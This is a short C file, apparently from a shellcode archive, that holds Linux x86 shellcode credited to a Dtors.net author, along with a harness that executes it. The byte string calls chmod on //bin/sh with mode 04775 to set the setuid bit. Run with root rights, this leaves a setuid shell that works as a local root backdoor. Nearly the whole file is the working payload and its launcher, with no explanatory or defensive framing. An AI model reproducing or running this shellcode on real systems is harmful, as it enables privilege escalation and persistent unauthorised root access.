/*
 * Linux x86 shellcode by bob from Dtors.net.
 * chmod("//bin/sh" ,04775); set sh +s
 */


#include <stdio.h>

char shellcode[]=
		"\x31\xc0\x31\xdb\x31\xc9\x53\x68\x6e"
		"\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89"
		"\xe3\x66\xb9\xfd\x09\xb0\x0f\xcd\x80"
		"\xb0\x01\xcd\x80";
int main()
{
        printf("Size: %d bytes.\n", sizeof(shellcode)); 
        (*(void(*) ()) shellcode) ();
}

